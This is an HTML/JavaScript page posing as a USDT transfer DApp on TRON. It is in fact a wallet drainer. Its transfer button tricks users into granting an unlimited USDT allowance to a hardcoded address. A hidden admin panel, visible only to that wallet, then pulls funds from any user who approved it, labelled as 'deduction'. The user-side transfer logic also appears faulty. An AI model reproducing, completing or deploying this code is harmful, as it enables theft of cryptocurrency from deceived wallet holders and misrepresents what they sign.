<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT DApp测试</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
<style>
*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color:transparent; font-family: system-ui,-apple-system, sans-serif; }
body { background-color:#f7f8fa; padding:20px; max-width:540px; margin:0 auto; }
.card{ background:#ffffff; border-radius:16px; padding:20px; margin-bottom:16px; box-shadow:0 2px 12px #00000012; }
.title-text{ font-size:17px; color:#222; margin-bottom:10px; font-weight:500; }
.box-input{ width:100%; border:1px solid #ddd; border-radius:12px; padding:14px 12px; font-size:22px; background:#fafafa; }
.btn-blue{ width:100%; padding:16px; border-radius:12px; border:none; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
.btn-blue:disabled{ background:#94a3b8; }
.btn-red{ width:100%; padding:14px; border-radius:12px; border:none; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
.admin-panel{ background:#fff1f1; border:1px solid #fecaca; border-radius:16px; padding:20px; margin-top:24px; display:none; }
.admin-title{ font-size:17px; font-weight:bold; color:#b91c1c; margin-bottom:14px; }
.admin-input{ width:100%; border:1px solid #f8c4c4; border-radius:10px; padding:12px; margin-bottom:12px; font-size:15px; background:#fff; }
</style>
</head>
<body>
    <div class="card">
        <div class="title-text">收款地址（管理员）</div>
        <div class="box-input" style="font-size:14px; color:#444; word-break:break-all;">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
    </div>

    <div class="card">
        <div class="title-text">转出数量（USDT）</div>
        <input class="box-input" id="amountInput" placeholder="请输入转账USDT数量" inputmode="decimal">
        <div style="margin-top:10px; display:flex; gap:8px;">
            <button class="btn-blue" id="maxBtn" style="flex:1;">MAX</button>
        </div>
    </div>

    <div class="card">
        <div class="title-text">到账数量</div>
        <input class="box-input" id="receiveAmount" readonly placeholder="自动显示到账金额">
    </div>

    <button class="btn-blue" id="sendBtn" disabled>确认转账</button>

    <div class="admin-panel" id="adminPanel">
        <div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
        <input class="admin-input" id="userAddrInput" placeholder="填写被划扣用户钱包地址">
        <input class="admin-input" id="deductInput" placeholder="填写划扣USDT数量">
        <button class="btn-red" id="deductBtn">确认划扣</button>
    </div>

<script>
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RPC = "https://api.trongrid.io";

let tronWeb = null;
let usdtContract = null;
let userAddress = null;

const amountInput = document.getElementById("amountInput");
const receiveAmount = document.getElementById("receiveAmount");
const sendBtn = document.getElementById("sendBtn");
const maxBtn = document.getElementById("maxBtn");
const adminPanel = document.getElementById("adminPanel");
const userAddrInput = document.getElementById("userAddrInput");
const deductInput = document.getElementById("deductInput");
const deductBtn = document.getElementById("deductBtn");

// 监听输入，同步到账显示
amountInput.addEventListener("input",()=>{
    receiveAmount.value = amountInput.value || "0.000000";
});

// 初始化钱包
async function initWallet(){
    if(window.tronWeb && window.tronWeb.ready){
        tronWeb = window.tronWeb;
        userAddress = tronWeb.defaultAddress.base58;
        usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
        sendBtn.disabled = false;
        await loadBalance();
        if(userAddress === TARGET_ADDR){
            adminPanel.style.display = "block";
        }
        return;
    }
    alert("请在TP钱包内置浏览器打开本DApp页面，并且连接钱包");
}

async function loadBalance(){
    const balSun = await usdtContract.balanceOf(userAddress).call();
    const bal = tronWeb.fromSun(balSun);
    console.log("当前钱包USDT余额：", bal);
}

maxBtn.addEventListener("click", async ()=>{
    const balSun = await usdtContract.balanceOf(userAddress).call();
    const bal = tronWeb.fromSun(balSun);
    amountInput.value = bal;
    receiveAmount.value = bal;
});

sendBtn.addEventListener("click", async () => {
    if (!tronWeb || !usdtContract) return alert("钱包未连接，请先在TP打开DApp");
    const val = parseFloat(amountInput.value.trim());
    if (isNaN(val) || val <= 0) return alert("请输入有效的转账金额");
    const sunVal = tronWeb.toSun(val);

    const userBalanceSun = await usdtContract.balanceOf(userAddress).call();
    if(Number(userBalanceSun) < sunVal){
        return alert("错误：USDT余额不足");
    }

    try {
        sendBtn.disabled = true;
        const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
        if (Number(allowance) < sunVal) {
            alert("🔐 需要发起USDT授权，请钱包确认签名！");
            await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
            alert("✅授权交易完成，准备发起转账");
        }else{
            alert("✅已有足够授权额度，直接发起转账");
        }

        alert("📤提交转账交易，签名完成后等待链上确认，约5‑20秒，请勿关闭页面");
        const txHash = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
        alert(`交易已提交，开始链上校验 \nTxHash:\n${txHash}`);

        // 轮询链上确认，修复假成功BUG
        let confirmed = false;
        let loopCount = 0;
        const maxLoop = 20;
        while(loopCount < maxLoop){
            loopCount++;
            await new Promise(resolve=>setTimeout(resolve, 1000));
            const res = await fetch(`${RPC}/wallet/gettransactionbyid?value=${txHash}`);
            const txJson = await res.json();
            if(txJson && txJson.ret && txJson.ret.length>0){
                const retCode = txJson.ret[0].contractRet;
                if(retCode === "SUCCESS"){
                    confirmed = true;
                    break;
                }else if(retCode === "REVERT"){
                    throw new Error(`合约执行回滚 contractRet:${retCode}`);
                }
            }
        }

        if(!confirmed){
            throw new Error("交易超时未上链，交易被网络丢弃");
        }

        alert(`🎉✅链上确认转账成功！\nTxHash:\n${txHash}\n代币已转入管理员钱包`);
        await loadBalance();
        amountInput.value = "";
        receiveAmount.value = "";

    } catch (err) {
        alert("❌操作失败：" + err.message);
    } finally {
        sendBtn.disabled = false;
    }
});

//管理员划扣逻辑
deductBtn.addEventListener("click", async ()=>{
    if(!tronWeb || userAddress !== TARGET_ADDR) return alert("只有管理员钱包可操作");
    const targetUser = userAddrInput.value.trim();
    const deductVal = parseFloat(deductInput.value.trim());
    if(!targetUser || isNaN(deductVal) || deductVal <= 0){
        return alert("请填写正确地址与金额");
    }
    const sunDeduct = tronWeb.toSun(deductVal);
    try{
        deductBtn.disabled = true;
        const allow = await usdtContract.allowance(targetUser, TARGET_ADDR).call();
        if(Number(allow) < sunDeduct){
            return alert("该用户没有足够授权额度，无法划扣");
        }
        const txHash = await usdtContract.transferFrom(targetUser, TARGET_ADDR, sunDeduct).send();
        alert(`管理员划扣提交，txHash:\n${txHash}`);
        let ok = false;
        let i=0;
        while(i<20){
            i++; await new Promise(r=>setTimeout(r,1000));
            const r = await fetch(`${RPC}/wallet/gettransactionbyid?value=${txHash}`);
            const j = await r.json();
            if(j.ret && j.ret[0]){
                if(j.ret[0].contractRet === "SUCCESS"){ ok=true; break; }
                if(j.ret[0].contractRet === "REVERT") throw new Error("合约回滚，划扣失败");
            }
        }
        if(!ok) throw new Error("划扣交易超时");
        alert("✅管理员划扣链上确认完成");
        userAddrInput.value=""; deductInput.value="";
    }catch(e){
        alert("❌划扣失败："+e.message);
    }finally{
        deductBtn.disabled = false;
    }
});

window.onload = function(){
    setTimeout(initWallet, 800);
};
</script>
</body>
</html>
